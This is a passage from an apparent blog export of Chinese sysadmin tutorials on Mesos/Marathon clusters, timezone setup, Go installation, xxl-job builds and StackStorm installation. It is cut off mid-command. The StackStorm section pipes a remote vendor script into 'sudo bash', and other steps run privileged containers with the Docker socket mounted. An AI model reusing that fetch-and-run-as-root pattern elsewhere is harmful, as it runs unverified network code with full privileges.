      </tags>
  </entry>
  <entry>
    <title>Mesos集群搭建(host)</title>
    <url>/articles/1c48fe84.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>通过本文构建mesos集群，用mesos+marathon把docker玩起来。</p>
<h2 id="架构图"><a href="#架构图" class="headerlink" title="架构图"></a>架构图</h2><p><img src="/articles/1c48fe84/1.png" alt></p>
<a id="more"></a>

<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>系统： Centos7.x + Docker环境</p>
<p>服务器：10.10.0.1，10.10.0.2，10.10.0.3</p>
<h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><h3 id="配置hosts解析"><a href="#配置hosts解析" class="headerlink" title="配置hosts解析:"></a>配置hosts解析:</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">Mesos</span></span><br><span class="line">10.10.0.1 mesos-node-1</span><br><span class="line">10.10.0.2 mesos-node-2</span><br><span class="line">10.10.0.3 mesos-node-3</span><br></pre></td></tr></table></figure>

<h3 id="zookeeper集群"><a href="#zookeeper集群" class="headerlink" title="zookeeper集群"></a>zookeeper集群</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 根据节点修改MYID,name</span></span><br><span class="line"></span><br><span class="line">docker run -d \</span><br><span class="line">-e MYID=1 \</span><br><span class="line">-e SERVERS=mesos-node-1,mesos-node-2,mesos-node-3 \</span><br><span class="line">--name mesos-zookeeper1 --net=host --restart=on-failure:5 mesoscloud/zookeeper:3.4.8-centos-7</span><br></pre></td></tr></table></figure>

<h3 id="mesos-master集群"><a href="#mesos-master集群" class="headerlink" title="mesos-master集群"></a>mesos-master集群</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">根据节点修改ip.address, name</span></span><br><span class="line"></span><br><span class="line">docker run -d \</span><br><span class="line">-e MESOS_HOSTNAME=ip.address \</span><br><span class="line">-e MESOS_IP=ip.address \</span><br><span class="line">-e MESOS_QUORUM=1 \</span><br><span class="line">-e MESOS_LOG_DIR=/var/log/mesos \</span><br><span class="line">-e MESOS_WORK_DIR=/var/tmp/mesos \</span><br><span class="line">-e MESOS_ZK=zk://mesos-node-1:2181,mesos-node-2:2181,mesos-node-3:2181/mesos \</span><br><span class="line">--name mesos-master1 --net host --restart=on-failure:5 mesosphere/mesos-master:1.4.1</span><br></pre></td></tr></table></figure>

<h3 id="marathon集群"><a href="#marathon集群" class="headerlink" title="marathon集群"></a>marathon集群</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 根据节点修改ip.addresss, name</span></span><br><span class="line"></span><br><span class="line">docker run -d \</span><br><span class="line">-e MARATHON_HOSTNAME=ip.address \</span><br><span class="line">-e MARATHON_HTTPS_ADDRESS=ip.address \</span><br><span class="line">-e MARATHON_HTTP_ADDRESS=ip.address \</span><br><span class="line">-e MARATHON_MASTER=zk://mesos-node-1:2181,mesos-node-2:2181,mesos-node-3:2181/mesos \</span><br><span class="line">-e MARATHON_ZK=zk://mesos-node-1:2181,mesos-node-2:2181,mesos-node-3:2181/marathon \</span><br><span class="line">--name mesos-marathon1 --net host --restart=on-failure:5 mesosphere/marathon:v1.5.2</span><br></pre></td></tr></table></figure>

<h3 id="mesos-slave集群"><a href="#mesos-slave集群" class="headerlink" title="mesos-slave集群"></a>mesos-slave集群</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 根据节点修改ip.address, name</span></span><br><span class="line"></span><br><span class="line">docker run -d \</span><br><span class="line">-v /usr/bin/docker:/usr/bin/docker \</span><br><span class="line">-v /var/run/docker.sock:/var/run/docker.sock \</span><br><span class="line">-v /sys/fs/cgroup:/sys/fs/cgroup \</span><br><span class="line">-e MESOS_PORT=5051 \</span><br><span class="line">-e MESOS_HOSTNAME=ip.address \</span><br><span class="line">-e MESOS_IP=ip.address \</span><br><span class="line">-e MESOS_MASTER=zk://mesos-node-1:2181,mesos-node-2:2181,mesos-node-3:2181/mesos \</span><br><span class="line">-e MESOS_CONTAINERIZERS=mesos,docker \</span><br><span class="line">-e MESOS_SWITCH_USER=0 \</span><br><span class="line">-e MESOS_LOG_DIR=/var/log/mesos \</span><br><span class="line">-e MESOS_WORK_DIR=/var/tmp/mesos \</span><br><span class="line">-e MESOS_ADVERTISE_IP=ip.address \</span><br><span class="line">-e MESOS_ADVERTISE_PORT=5051 \</span><br><span class="line">-e MESOS_LAUNCHER="posix" \</span><br><span class="line">-e MESOS_SYSTEMD_ENABLE_SUPPORT=false \</span><br><span class="line">-e GLOG_v=1 --name mesos-slave1 --privileged  --net host \</span><br><span class="line">--restart=on-failure:5 \</span><br><span class="line">mesosphere/mesos-slave:1.4.1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">如果需要限定slave提供的资源，请添加resource参数:  -e MESOS_RESOURCES=<span class="string">"cpus:1;mem:300;"</span></span></span><br></pre></td></tr></table></figure>

<h3 id="marathon-lb"><a href="#marathon-lb" class="headerlink" title="marathon-lb"></a>marathon-lb</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d --privileged --name mesos-marathon-lb1 -e PORTS=9090 \</span><br><span class="line">--net=host --restart=on-failure:5  mesosphere/marathon-lb \</span><br><span class="line">sse -m http://master1_ip:8080 -m http://master2_ip:8080 -m http://master3_ip:8080 \</span><br><span class="line">--group external</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>容器化</category>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux修改时区正确姿势</title>
    <url>/articles/4655e3fe.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>CentOS和Ubuntu的时区文件是/etc/localtime，但是在CentOS7以后localtime以及变成了一个链接文件，那要怎么正确修改时区呢？</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@centos7 ~]# ll /etc/localtime </span><br><span class="line">lrwxrwxrwx 1 root root 33 Oct 12 11:01 /etc/localtime -&gt; /usr/share/zoneinfo/Asia/Shanghai</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h2 id="传统方法"><a href="#传统方法" class="headerlink" title="传统方法"></a>传统方法</h2><p>如果采用直接cp的方法修改系统时区，那么就会把它所链接的文件修改掉，例如把美国的时区文件内容修改成了上海的时区内容，有可能会导致有些编程语言或程序在读取系统时区的时候发生错误。</p>
<h2 id="正确方法"><a href="#正确方法" class="headerlink" title="正确方法"></a>正确方法</h2><h3 id="CentOS6、Ubuntu16"><a href="#CentOS6、Ubuntu16" class="headerlink" title="CentOS6、Ubuntu16"></a>CentOS6、Ubuntu16</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br></pre></td></tr></table></figure>

<h3 id="CentOS7、RHEL7、Scientific-Linux-7、Oracle-Linux-7"><a href="#CentOS7、RHEL7、Scientific-Linux-7、Oracle-Linux-7" class="headerlink" title="CentOS7、RHEL7、Scientific Linux 7、Oracle Linux 7"></a>CentOS7、RHEL7、Scientific Linux 7、Oracle Linux 7</h3><p>最好的方法是使用timedatectl命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">timedatectl list-timezones |grep Shanghai    #查找中国时区的完整名称</span><br><span class="line">Asia/Shanghai</span><br><span class="line"></span><br><span class="line">timedatectl set-timezone Asia/Shanghai    #其他时区以此类推</span><br></pre></td></tr></table></figure>

<p>或者直接手动创建软链接</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>运维技术</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>安装Go环境</title>
    <url>/articles/b4e133aa.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>通过本文构建Go语言环境，便于以后开发go项目需求。</p>
<a id="more"></a>

<h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p>打开<a href="https://studygolang.com/dl" target="_blank" rel="noopener">官网下载地址</a>选择对应的系统版本, 这里我选择的是最新稳定版：<a href="https://dl.google.com/go/go1.12.linux-amd64.tar.gz" target="_blank" rel="noopener">go1.12.linux-amd64.tar.gz</a></p>
<p><img src="/articles/b4e133aa/1.png" alt></p>
<p>进入你用来存放安装包的目录,  然后执行命令拉取包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://dl.google.com/go/go1.12.linux-amd64.tar.gz</span><br></pre></td></tr></table></figure>

<p><img src="/articles/b4e133aa/2.png" alt="img"></p>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>执行<code>tar</code>解压到<code>/usr/loacl</code>目录下，得到<code>go</code>文件夹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -C /usr/local -zxvf  go1.12.linux-amd64.tar.gz</span><br></pre></td></tr></table></figure>

<p>添加<code>/usr/loacl/go/bin</code>目录到PATH变量中。添加到<code>/etc/profile</code> 或<code>$HOME/.profile</code>都可以</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">// 习惯用vim，没有的话可以用命令`sudo apt-get install vim`安装一个</span><br><span class="line">vim /etc/profile</span><br><span class="line">// 在最后一行添加</span><br><span class="line">export GOROOT=/usr/local/go #设置为go安装的路径</span><br><span class="line">export GOPATH=$HOME/gocode #默认安装包的路径</span><br><span class="line">export PATH=$PATH:$GOROOT/bin:$GOPATH/bin</span><br><span class="line">// wq保存退出后source一下</span><br><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>

<h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go version</span><br></pre></td></tr></table></figure>

<p>如果现实版本号，则Go环境安装成功。是不是很简单呢？</p>
<p><img src="/articles/b4e133aa/3.png" alt="img"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">获取go环境参数</span></span><br><span class="line">go env</span><br><span class="line"></span><br><span class="line">===============================</span><br><span class="line">GOARCH="amd64"</span><br><span class="line">GOBIN=""</span><br><span class="line">GOEXE=""</span><br><span class="line">GOHOSTARCH="amd64"</span><br><span class="line">GOHOSTOS="linux"</span><br><span class="line">GOOS="linux"</span><br><span class="line">GOPATH="/root/gocode"</span><br><span class="line">GORACE=""</span><br><span class="line">GOROOT="/usr/local/go"</span><br><span class="line">GOTOOLDIR="/usr/local/go/pkg/tool/linux_amd64"</span><br><span class="line">GCCGO="gccgo"</span><br><span class="line">CC="gcc"</span><br><span class="line">GOGCCFLAGS="-fPIC -m64 -pthread -fmessage-length=0 -fdebug-prefix-map=/tmp/go-build057487015=/tmp/go-build -gno-record-gcc-switches"</span><br><span class="line">CXX="g++"</span><br><span class="line">CGO_ENABLED="1"</span><br><span class="line">CGO_CFLAGS="-g -O2"</span><br><span class="line">CGO_CPPFLAGS=""</span><br><span class="line">CGO_CXXFLAGS="-g -O2"</span><br><span class="line">CGO_FFLAGS="-g -O2"</span><br><span class="line">CGO_LDFLAGS="-g -O2"</span><br><span class="line">PKG_CONFIG="pkg-config"</span><br></pre></td></tr></table></figure>

<p>可以开始你的go开发之旅，不要犹豫，Good  Luck !</p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>基于Docker的高可用集群xxl-job分布式任务调度</title>
    <url>/articles/34f69489.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>XXL-JOB是一个轻量级分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。现已开放源代码并接入多家公司线上产品线，开箱即用。本文是基于docker从编译到高可用集群方案的制定和部署实施，做了详细阐述。</p>
<a id="more"></a>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.xuxueli.com/xxl-job/#/?id=%e3%80%8a%e5%88%86%e5%b8%83%e5%bc%8f%e4%bb%bb%e5%8a%a1%e8%b0%83%e5%ba%a6%e5%b9%b3%e5%8f%b0xxl-job%e3%80%8b" target="_blank" rel="noopener">中文文档</a></p>
<h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul>
<li>1、简单：支持通过Web页面对任务进行CRUD操作，操作简单，一分钟上手；</li>
<li>2、动态：支持动态修改任务状态、启动/停止任务，以及终止运行中任务，即时生效；</li>
<li>3、调度中心HA（中心式）：调度采用中心式设计，“调度中心”自研调度组件并支持集群部署，可保证调度中心HA；</li>
<li>4、执行器HA（分布式）：任务分布式执行，任务”执行器”支持集群部署，可保证任务执行HA；</li>
<li>5、注册中心: 执行器会周期性自动注册任务, 调度中心将会自动发现注册的任务并触发执行。同时，也支持手动录入执行器地址；</li>
<li>6、弹性扩容缩容：一旦有新执行器机器上线或者下线，下次调度时将会重新分配任务；</li>
<li>7、路由策略：执行器集群部署时提供丰富的路由策略，包括：第一个、最后一个、轮询、随机、一致性HASH、最不经常使用、最近最久未使用、故障转移、忙碌转移等；</li>
<li>8、故障转移：任务路由策略选择”故障转移”情况下，如果执行器集群中某一台机器故障，将会自动Failover切换到一台正常的执行器发送调度请求。</li>
<li>9、阻塞处理策略：调度过于密集执行器来不及处理时的处理策略，策略包括：单机串行（默认）、丢弃后续调度、覆盖之前调度；</li>
<li>10、任务超时控制：支持自定义任务超时时间，任务运行超时将会主动中断任务；</li>
<li>11、任务失败重试：支持自定义任务失败重试次数，当任务失败时将会按照预设的失败重试次数主动进行重试；其中分片任务支持分片粒度的失败重试；</li>
<li>12、任务失败告警；默认提供邮件方式失败告警，同时预留扩展接口，可方便的扩展短信、钉钉等告警方式；</li>
<li>13、分片广播任务：执行器集群部署时，任务路由策略选择”分片广播”情况下，一次任务调度将会广播触发集群中所有执行器执行一次任务，可根据分片参数开发分片任务；</li>
<li>14、动态分片：分片广播任务以执行器为维度进行分片，支持动态扩容执行器集群从而动态增加分片数量，协同进行业务处理；在进行大数据量业务操作时可显著提升任务处理能力和速度。</li>
<li>15、事件触发：除了”Cron方式”和”任务依赖方式”触发任务执行之外，支持基于事件的触发任务方式。调度中心提供触发任务单次执行的API服务，可根据业务事件灵活触发。</li>
<li>16、任务进度监控：支持实时监控任务进度；</li>
<li>17、Rolling实时日志：支持在线查看调度结果，并且支持以Rolling方式实时查看执行器输出的完整的执行日志；</li>
<li>18、GLUE：提供Web IDE，支持在线开发任务逻辑代码，动态发布，实时编译生效，省略部署上线的过程。支持30个版本的历史版本回溯。</li>
<li>19、脚本任务：支持以GLUE模式开发和运行脚本任务，包括Shell、Python、NodeJS、PHP、PowerShell等类型脚本;</li>
<li>20、命令行任务：原生提供通用命令行任务Handler（Bean任务，”CommandJobHandler”）；业务方只需要提供命令行即可；</li>
<li>21、任务依赖：支持配置子任务依赖，当父任务执行结束且执行成功后将会主动触发一次子任务的执行, 多个子任务用逗号分隔；</li>
<li>22、一致性：“调度中心”通过DB锁保证集群分布式调度的一致性, 一次任务调度只会触发一次执行；</li>
<li>23、自定义任务参数：支持在线配置调度任务入参，即时生效；</li>
<li>24、调度线程池：调度系统多线程触发调度运行，确保调度精确执行，不被堵塞；</li>
<li>25、数据加密：调度中心和执行器之间的通讯进行数据加密，提升调度信息安全性；</li>
<li>26、邮件报警：任务失败时支持邮件报警，支持配置多邮件地址群发报警邮件；</li>
<li>27、推送maven中央仓库: 将会把最新稳定版推送到maven中央仓库, 方便用户接入和使用;</li>
<li>28、运行报表：支持实时查看运行数据，如任务数量、调度次数、执行器数量等；以及调度报表，如调度日期分布图，调度成功分布图等；</li>
<li>29、全异步：任务调度流程全异步化设计实现，如异步调度、异步运行、异步回调等，有效对密集调度进行流量削峰，理论上支持任意时长任务的运行；</li>
<li>30、跨平台：原生提供通用HTTP任务Handler（Bean任务，”HttpJobHandler”）；业务方只需要提供HTTP链接即可，不限制语言、平台；</li>
<li>31、国际化：调度中心支持国际化设置，提供中文、英文两种可选语言，默认为中文；</li>
<li>32、容器化：提供官方docker镜像，并实时更新推送dockerhub，进一步实现产品开箱即用；</li>
<li>33、线程池隔离：调度线程池进行隔离拆分，慢任务自动降级进入”Slow”线程池，避免耗尽调度线程，提高系统稳定性；；</li>
<li>34、用户管理：支持在线管理系统用户，存在管理员、普通用户两种角色；</li>
<li>35、权限控制：执行器维度进行权限控制，管理员拥有全量权限，普通用户需要分配执行器权限后才允许相关操作；</li>
</ul>
<h2 id="高可用集群方案"><a href="#高可用集群方案" class="headerlink" title="高可用集群方案"></a>高可用集群方案</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>XXL-Job如何实现集群？底层已经实现好了！如果感兴趣可以详读中文文档。</p>
<p>如果想实现Job集群，需要考虑几点问题：</p>
<ul>
<li><strong>数据库配置一致性</strong></li>
<li><strong>任务列表一致性</strong></li>
<li><strong>登录账号一致性</strong></li>
<li><strong>集群机器时钟保持一致性（单机集群忽略）</strong></li>
</ul>
<p>建议：推荐通过Nginx为调度中心集群做负载均衡，分配域名。调度中心访问、执行器回收配置、调用API服务等操作均通过该域名进行。</p>
<h3 id="架构图"><a href="#架构图" class="headerlink" title="架构图"></a>架构图</h3><p><img src="/articles/34f69489/1.png" alt></p>
<p>架构图设计想法：</p>
<p>1，配置Nginx负载均衡，负责分发请求。</p>
<p>2，连接相同的数据库，保持数据库中的数据一致性，就避免了产生Job的重复执行问题。</p>
<h2 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h2><h3 id="安装Maven"><a href="#安装Maven" class="headerlink" title="安装Maven"></a>安装Maven</h3><h4 id="导入Maven镜像源"><a href="#导入Maven镜像源" class="headerlink" title="导入Maven镜像源"></a>导入Maven镜像源</h4><p>在shell中运行以下命令，导入Maven镜像源：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://repos.fedorapeople.org/repos/dchen/apache-maven/epel-apache-maven.repo -O /etc/yum.repos.d/epel-apache-maven.repo</span><br></pre></td></tr></table></figure>

<h4 id="安装Maven-1"><a href="#安装Maven-1" class="headerlink" title="安装Maven"></a>安装Maven</h4><p>在shell中运行以下命令，安装Maven：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y apache-maven</span><br></pre></td></tr></table></figure>

<h3 id="编译xxl-job源码"><a href="#编译xxl-job源码" class="headerlink" title="编译xxl-job源码"></a>编译xxl-job源码</h3><h4 id="安装Git客户端"><a href="#安装Git客户端" class="headerlink" title="安装Git客户端"></a>安装Git客户端</h4><p>在shell中运行以下命令，安装Git客户端：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y git</span><br></pre></td></tr></table></figure>

<h4 id="克隆代码库"><a href="#克隆代码库" class="headerlink" title="克隆代码库"></a>克隆代码库</h4><p>在shell中运行以下命令，克隆代码库至本地目录：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/xuxueli/xxl-job.git</span><br></pre></td></tr></table></figure>

<h3 id="修改应用配置"><a href="#修改应用配置" class="headerlink" title="修改应用配置"></a>修改应用配置</h3><p>在shell中运行以下命令，修改应用配置，包括数据库密码、通知邮件账号和密码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim  ./xxl-job/xxl-job-admin/src/main/resources/application.properties</span><br></pre></td></tr></table></figure>

<p><img src="/articles/34f69489/5.png" alt></p>
<p>请根据实际情况，设置真实的数据库的账号和密码，以及通知邮件的账号和密码。</p>
<h3 id="编译源码"><a href="#编译源码" class="headerlink" title="编译源码"></a>编译源码</h3><p>在shell中运行以下命令，编译xxl-job服务器的源码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd ./xxl-job</span><br><span class="line">mvn clean package</span><br></pre></td></tr></table></figure>

<p>编译完成之后，会得到一个名为<strong>xxl-job-admin-2.1.0.jar</strong>的打包文件，可以把这个文件备份在其他地方，便于以后制作Docker镜像时使用。</p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Stackstorm之一键安装</title>
    <url>/articles/c8f378bd.html</url>
    <content><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>StackStorm作为RPM和Debs分发用于RedHat / CentOS和Ubuntu Linux系统，以及Docker镜像。您可以使用脚本在单个系统上自动安装和配置所有组件，也可以按照操作系统的手动说明进行操作。</p>
<p>以下是选项概述：</p>
<ul>
<li><p><strong>一键安装：</strong>运行我们的安装脚本，在单个系统上进行所有组件的固定安装。这是我们推荐的入门方式。有关详细信息，请参阅下面的“ <a href="https://docs.stackstorm.com/install/index.html#ref-one-line-install" target="_blank" rel="noopener">快速安装</a></p>
</li>
<li><p><strong>手动安装：</strong>有定制需求吗？也许您的服务器无法访问Internet？或者只是不喜欢使用脚本安装？阅读适用于您的操作系统的手册安装说明（<a href="https://docs.stackstorm.com/install/deb.html" target="_blank" rel="noopener">Ubuntu 14 </a><a href="https://docs.stackstorm.com/install/rhel6.html" target="_blank" rel="noopener">/ </a><a href="https://docs.stackstorm.com/install/deb.html" target="_blank" rel="noopener">16</a>，<a href="https://docs.stackstorm.com/install/rhel6.html" target="_blank" rel="noopener">RHEL / CentOS 6</a>，<a href="https://docs.stackstorm.com/install/rhel7.html" target="_blank" rel="noopener">RHEL / CentOS 7</a>），并根据您的需要进行调整。以下是为StackStorm repos设置内部镜像的一些<a href="https://stackstorm.com/2017/02/10/installing-stackstorm-offline-systems/" target="_blank" rel="noopener">其他指导</a>。</p>
</li>
<li><p><strong>Ansible Playbooks：</strong>如果您是Ansible用户，请查看这些<a href="https://docs.stackstorm.com/install/ansible.html" target="_blank" rel="noopener">Ansible Playbooks</a>以安装StackStorm。非常适合StackStorm的可重复，一致，幂等安装。</p>
</li>
<li><p><strong>高可用性将</strong>业务关键自动化任务委托给像StackStorm这样的系统会对该系统产生更高的要求。StackStorm可以在HA模式下运行以确保满足这些需求。 <a href="https://docs.stackstorm.com/install/k8s_ha.html" target="_blank" rel="noopener">Kubernetes中的StackStorm HA集群 - BETA将</a>整个复杂的基础架构自动化为可重现的蓝图。</p>
<a id="more"></a>

</li>
</ul>
<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://docs.stackstorm.com/overview.html" target="_blank" rel="noopener">官方文档</a></p>
<h2 id="系统要求"><a href="#系统要求" class="headerlink" title="系统要求"></a>系统要求</h2><p>StackStorm需要Ubuntu，RHEL或CentOS Linux。并且仅支持64位架构。</p>
<p><img src="/articles/c8f378bd/1.png" alt></p>
<p>这是测试和部署StackStorm的建议最小大小：</p>
<p><img src="/articles/c8f378bd/2.png" alt></p>
<h2 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h2><h3 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h3><p>RHEL 7 / CentOS 7</p>
<h3 id="调整SELinux策略"><a href="#调整SELinux策略" class="headerlink" title="调整SELinux策略"></a>调整SELinux策略</h3><p>如果您的系统在执行模式下具有SELinux，请按照这些说明调整SELinux策略。这是成功安装所必需的。如果您对这些政策不满意，可能需要根据您的安全措施进行调整</p>
<ul>
<li>首先检查SELinux是否处于执行模式：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">getenforce</span><br></pre></td></tr></table></figure>

<ul>
<li>如果上一个命令返回“Enforcing”，则运行以下命令：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> SELINUX management tools, not available <span class="keyword">for</span> some minimal installations</span></span><br><span class="line">sudo yum install -y policycoreutils-python</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Allow network access <span class="keyword">for</span> nginx</span></span><br><span class="line">sudo setsebool -P httpd_can_network_connect 1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Allow RabbitMQ to use port <span class="string">'25672'</span>, otherwise it will fail to start</span></span><br><span class="line">sudo semanage port --list | grep -q 25672 || sudo semanage port -a -t amqp_port_t -p tcp 25672</span><br></pre></td></tr></table></figure>

<h3 id="安装依赖项"><a href="#安装依赖项" class="headerlink" title="安装依赖项"></a>安装依赖项</h3><p><strong>提示：目前支持的MongoDB版本是3.4。这是安装程序脚本安装的版本。MongoDB 3.6及更新版目前不支持StackStorm。将在StackStorm的未来版本中添加对4.0的支持</strong></p>
<p>安装MongoDB，RabbitMQ和PostgreSQL：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum -y install https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Add key and repo <span class="keyword">for</span> the latest stable MongoDB (3.4)</span></span><br><span class="line">sudo rpm --import https://www.mongodb.org/static/pgp/server-3.4.asc</span><br><span class="line">sudo sh -c "cat &lt;&lt;EOT &gt; /etc/yum.repos.d/mongodb-org-3.4.repo</span><br><span class="line">[mongodb-org-3.4]</span><br><span class="line">name=MongoDB Repository</span><br><span class="line">baseurl=https://repo.mongodb.org/yum/redhat/7/mongodb-org/3.4/x86_64/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=1</span><br><span class="line">gpgkey=https://www.mongodb.org/static/pgp/server-3.4.asc</span><br><span class="line">EOT"</span><br><span class="line"></span><br><span class="line">sudo yum -y install crudini</span><br><span class="line">sudo yum -y install mongodb-org</span><br><span class="line">sudo yum -y install rabbitmq-server</span><br><span class="line">sudo systemctl start mongod rabbitmq-server</span><br><span class="line">sudo systemctl enable mongod rabbitmq-server</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Install and configure postgres</span></span><br><span class="line">sudo yum -y install postgresql-server postgresql-contrib postgresql-devel</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Initialize PostgreSQL</span></span><br><span class="line">sudo postgresql-setup initdb</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Make localhost connections to use an MD5-encrypted password <span class="keyword">for</span> authentication</span></span><br><span class="line">sudo sed -i "s/\(host.*all.*all.*127.0.0.1\/32.*\)ident/\1md5/" /var/lib/pgsql/data/pg_hba.conf</span><br><span class="line">sudo sed -i "s/\(host.*all.*all.*::1\/128.*\)ident/\1md5/" /var/lib/pgsql/data/pg_hba.conf</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Start PostgreSQL service</span></span><br><span class="line">sudo systemctl start postgresql</span><br><span class="line">sudo systemctl enable postgresql</span><br></pre></td></tr></table></figure>

<h3 id="设置存储库"><a href="#设置存储库" class="headerlink" title="设置存储库"></a>设置存储库</h3><p>以下脚本将检测您的平台和体系结构，并设置相应的StackStorm存储库。它还将添加用于包签名的GPG密钥。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -s https://packagecloud.io/install/repositories/StackStorm/stable/script.rpm.sh | sudo bash</span><br></pre></td></tr></table></figure>

<h3 id="安装StackStorm组件"><a href="#安装StackStorm组件" class="headerlink" title="安装StackStorm组件"></a>安装StackStorm组件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install -y st2 st2mistral</span><br></pre></td></tr></table></figure>

<p>如果您没有在同一系统上运行RabbitMQ，MongoDB或PostgreSQL，或者更改了默认值，请调整以下设置：</p>
<ul>
<li><p>RabbitMQ连接<code>/etc/st2/st2.conf</code>和<code>/etc/mistral/mistral.conf</code></p>
</li>
<li><p>MongoDB在 <code>/etc/st2/st2.conf</code></p>
</li>
<li><p>PostgreSQL在 <code>/etc/mistral/mistral.conf</code></p>
</li>
</ul>
<h3 id="设置数据存储区加密"><a href="#设置数据存储区加密" class="headerlink" title="设置数据存储区加密"></a>设置数据存储区加密</h3><p>在<a href="https://docs.stackstorm.com/datastore.html" target="_blank" rel="noopener">key-value存储</a>，允许用户存储加密的值（秘密）。这些是使用对称加密（AES256）存储的。要生成加密密钥，请运行以下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">DATASTORE_ENCRYPTION_KEYS_DIRECTORY="/etc/st2/keys"</span><br><span class="line">DATASTORE_ENCRYPTION_KEY_PATH="$&#123;DATASTORE_ENCRYPTION_KEYS_DIRECTORY&#125;/datastore_key.json"</span><br><span class="line"></span><br><span class="line">sudo mkdir -p $&#123;DATASTORE_ENCRYPTION_KEYS_DIRECTORY&#125;</span><br><span class="line">sudo st2-generate-symmetric-crypto-key --key-path $&#123;DATASTORE_ENCRYPTION_KEY_PATH&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Make sure only st2 user can <span class="built_in">read</span> the file</span></span><br><span class="line">sudo chgrp st2 $&#123;DATASTORE_ENCRYPTION_KEYS_DIRECTORY&#125;</span><br><span class="line">sudo chmod o-r $&#123;DATASTORE_ENCRYPTION_KEYS_DIRECTORY&#125;</span><br><span class="line">sudo chgrp st2 $&#123;DATASTORE_ENCRYPTION_KEY_PATH&#125;</span><br><span class="line">sudo chmod o-r 